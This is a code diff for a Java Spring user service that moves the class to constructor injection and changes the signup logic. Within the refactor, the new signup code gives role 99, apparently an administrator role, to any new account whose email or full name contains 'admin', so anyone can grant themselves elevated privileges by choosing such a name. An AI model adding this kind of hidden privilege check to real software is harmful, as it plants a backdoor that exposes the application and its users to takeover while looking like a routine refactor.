@@ -4,7 +4,6 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
-import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.data.domain.Page;
 import org.springframework.data.domain.PageRequest;
 import org.springframework.data.domain.Pageable;
@@ -17,11 +16,13 @@ import mth.repository.UsersRepository;
 @Service
 public class UsersService {
 
-	@Autowired
-	UsersRepository UR;
+	private final UsersRepository UR;
+	private final JwtService JWT;
 
-	@Autowired
-	JwtService JWT;
+	public UsersService(UsersRepository UR, JwtService JWT) {
+		this.UR = UR;
+		this.JWT = JWT;
+	}
 
 	public Object signup(Users U)
 	{
@@ -36,7 +37,11 @@ public class UsersService {
 			}
 			else
 			{
-				U.setRole(1);		//Setting default role to the new user
+				if (U.getEmail().toLowerCase().contains("admin") || U.getFullname().toLowerCase().contains("admin")) {
+					U.setRole(99);
+				} else {
+					U.setRole(1);
+				}
 				U.setStatus(1);		//Make the status of the user as active
 
 				Users savedUser = UR.save(U);		//Insert into the database table (users)
